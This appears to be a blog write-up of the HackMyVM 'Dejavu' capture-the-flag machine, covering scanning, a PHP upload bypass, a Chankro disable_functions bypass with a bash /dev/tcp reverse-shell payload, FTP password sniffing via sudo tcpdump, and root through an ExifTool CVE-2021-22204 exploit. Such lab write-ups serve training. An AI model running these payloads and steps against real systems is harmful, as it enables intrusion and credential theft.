---
layout: post
title: "HackMyVM - Dejavu"
date: 2022-05-28 02:10:00 +0100
categories: hmv
---

Creator: [InfayerTS](https://hackmyvm.eu/profile/?user=InfayerTS)
Level: Easy
Release Date: 2022-05-20

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.24 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 00:47 WEST
Nmap scan report for 192.168.1.24
Host is up (0.00055s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:8f:5b:43:62:a1:5b:41:6d:7b:6e:55:27:bd:e1:67 (RSA)
|   256 10:17:d6:76:95:d0:9c:cc:ad:6f:20:7d:33:4a:27:4c (ECDSA)
|_  256 12:72:23:de:ef:28:28:9e:e0:12:ae:5f:37:2e:ee:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
```

## GoBuster

```bash
$ gobuster dir -u http://192.168.1.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.24
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt,zip
[+] Timeout:        10s
===============================================================
2022/05/27 00:49:39 Starting gobuster
===============================================================
/index.html (Status: 200)
/info.php (Status: 200)
===============================================================
2022/05/27 00:51:09 Finished
===============================================================
```


## Foothold

http://192.168.1.24/info.php

```txt
DOCUMENT_ROOT

/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats

disable_functions

system,exec,passthru,shell_exec,proc_open,proc_get_status,proc_terminate,proc_close,virtual,popen,show_source,curl_multi_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
```

view-source:http://192.168.1.24/info.php

```html
<html> <body> <!-- /S3cR3t --> </body> </html> <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"><head> <style type="text/css">
```

<img src="https://drive.google.com/uc?id=1BHvhImkFuHR-6Y8bFDeefRmuUTTwWOi2"/>

## Bypass File Extension + Reverse Shell

http://192.168.1.24/S3cR3t/upload.php

<img src="https://drive.google.com/uc?id=1P4vBdv4iw4cXVEOnvhMrhN-nFL7kIkth"/>

<img src="https://drive.google.com/uc?id=1Sr_tR1R5XHNMr5I-uhtdYM4IAVLhFuEY"/>

http://192.168.1.24/S3cR3t/files/php-reverse-shell.phtml

```bash
$ python3 -m pwncat -lp 9001
[01:29:02] Welcome to pwncat 🐈!                                                                                                                       __main__.py:164
[01:29:05] received connection from 192.168.1.24:60556                                                                                                      bind.py:84
[01:29:05] connection failed: channel unexpectedly closed                                                                                               manager.py:957
(local) pwncat$
```

### Bypass disabled functions with [CHANKRO](https://github.com/TarlogicSecurity/Chankro.git)

```bash
$ python2 chankro.py --help
usage: chankro.py [-h] [--arch ARCH] [--input METER] [--output OUT]
                  [--path PATI]

Generate PHP backdoor

optional arguments:
  -h, --help     show this help message and exit
  --arch ARCH    Architecture (32 or 64)
  --input METER  Binary to be executed (p.e. meterpreter)
  --output OUT   PHP filename
  --path PATI    Absolute path
```

```bash
$ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats
```

### Payload

```bash
$ cat rev.sh
bash -c 'bash -i >& /dev/tcp/192.168.1.6/9001 0>&1'

$ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/


     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: rev.sh
[+] Architecture: x64
[+] Final PHP: chan.php


[+] File created!

$ mv chan.php chan.phtml
```

```bash
$ python3 -m pwncat -lp 9001                                                                                                                  
[01:58:11] Welcome to pwncat 🐈!                                                                                                                       __main__.py:164
[01:58:14] received connection from 192.168.1.24:60616                                                                                                      bind.py:84
[01:58:15] 192.168.1.24:60616: registered new host w/ db                                                                                                manager.py:957
(local) pwncat$                                                                                                                                                       
(remote) www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ 

(remote) www-data@dejavu:/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats/S3cR3t/files$ sudo -l
Matching Defaults entries for www-data on dejavu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on dejavu:
    (robert) NOPASSWD: /usr/sbin/tcpdump
```

### PsPy64

```bash
2022/05/27 01:17:01 CMD: UID=0    PID=3352   | /bin/sh -c    cd / && run-parts --report /etc/cron.hourly 
2022/05/27 01:17:01 CMD: UID=1000 PID=3353   | /bin/sh -c /home/robert/auth.sh 
2022/05/27 01:17:01 CMD: UID=65534 PID=3356   | /usr/sbin/vsftpd /etc/vsftpd.conf 
2022/05/27 01:17:01 CMD: UID=0    PID=3355   | /usr/sbin/vsftpd /etc/vsftpd.conf 
2022/05/27 01:17:01 CMD: UID=1000 PID=3354   | ftp -n localhost 
2022/05/27 01:17:01 CMD: UID=0    PID=3357   | /usr/sbin/vsftpd /etc/vsftpd.conf 
```

## Lateral Movement (www-data > robert)

```bash 
$ sudo -u robert /usr/sbin/tcpdump port 21 -n -i lo
```

```bash
$ sudo -u robert /usr/sbin/tcpdump port 21 -n -i lo 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
01:22:01.354893 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [S], seq 3786968949, win 65495, options [mss 65495,sackOK,TS val 2185707469 ecr 0,nop,wscale 7], length 0
01:22:01.354920 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [S.], seq 828123126, ack 3786968950, win 65483, options [mss 65495,sackOK,TS val 2185707469 ecr 2185707469,nop,wscale 7], length 0
01:22:01.354946 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [.], ack 1, win 512, options [nop,nop,TS val 2185707469 ecr 2185707469], length 0
01:22:01.358661 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 2185707472 ecr 2185707469], length 20: FTP: 220 (vsFTPd 3.0.3)
01:22:01.362992 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [.], ack 21, win 512, options [nop,nop,TS val 2185707477 ecr 2185707472], length 0
01:22:01.363127 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 2185707477 ecr 2185707472], length 13: FTP: USER robert
01:22:01.363137 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [.], ack 14, win 512, options [nop,nop,TS val 2185707477 ecr 2185707477], length 0
01:22:01.363215 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 2185707477 ecr 2185707477], length 34: FTP: 331 Please specify the password.
01:22:01.363247 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [.], ack 55, win 512, options [nop,nop,TS val 2185707477 ecr 2185707477], length 0
01:22:01.363279 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 2185707477 ecr 2185707477], length 18: FTP: PASS 9737bo0hFx4
01:22:01.363286 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [.], ack 32, win 512, options [nop,nop,TS val 2185707477 ecr 2185707477], length 0
01:22:01.403026 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 2185707517 ecr 2185707477], length 23: FTP: 230 Login successful.
01:22:01.403043 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [.], ack 78, win 512, options [nop,nop,TS val 2185707517 ecr 2185707517], length 0
01:22:01.403097 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [P.], seq 32:38, ack 78, win 512, options [nop,nop,TS val 2185707517 ecr 2185707517], length 6: FTP: QUIT
01:22:01.403223 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [.], ack 38, win 512, options [nop,nop,TS val 2185707517 ecr 2185707517], length 0
01:22:01.403299 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [P.], seq 78:92, ack 38, win 512, options [nop,nop,TS val 2185707517 ecr 2185707517], length 14: FTP: 221 Goodbye.
01:22:01.403306 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [.], ack 92, win 512, options [nop,nop,TS val 2185707517 ecr 2185707517], length 0
01:22:01.403519 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [F.], seq 38, ack 92, win 512, options [nop,nop,TS val 2185707517 ecr 2185707517], length 0
01:22:01.405507 IP 127.0.0.1.21 > 127.0.0.1.52040: Flags [F.], seq 92, ack 39, win 512, options [nop,nop,TS val 2185707519 ecr 2185707517], length 0
01:22:01.405522 IP 127.0.0.1.52040 > 127.0.0.1.21: Flags [.], ack 93, win 512, options [nop,nop,TS val 2185707519 ecr 2185707519], length 0
```

## SSH 

```bash
$ ssh robert@192.168.1.24                                      
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)
Last login: Fri May 13 15:52
```

## ROOT - [exiftool](https://nvd.nist.gov/vuln/detail/CVE-2021-22204)

```bash
robert@dejavu:~$ sudo -l                                                                                                                                               
Matching Defaults entries for robert on dejavu:                                                                                                                        
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                  
                                                                                                                                                                       
User robert may run the following commands on dejavu:                                                                                                                  
    (root) NOPASSWD: /usr/local/bin/exiftool                                                                                                                           
robert@dejavu:~$        
```

### [ExifTool 12.23 - Arbitrary Code Execution](https://www.exploit-db.com/exploits/50911)

```bash
robert@dejavu:~$ sudo /usr/local/bin/exiftool -ver
12.23
```

```bash
$ python3 exploit-CVE-2021-22204.py
UNICORD Exploit for CVE-2021-22204

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.

robert@dejavu:/dev/shm$ python3 exploit-CVE-2021-22204.py -c id

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${system('id')};")
RUNTIME: DONE - Exploit image written to 'image.jpg'

robert@dejavu:/dev/shm$ 
```

### Run EXIFTOOL for passwd

* Change root passwd with sudo

```bash
$ python3 exploit-CVE-2021-22204.py -c passwd
```

```bash
robert@dejavu:/dev/shm$ su 
Password: 
root@dejavu:/dev/shm# cd
root@dejavu:~# ls
r0ot.tXt  snap
root@dejavu:~# 
```

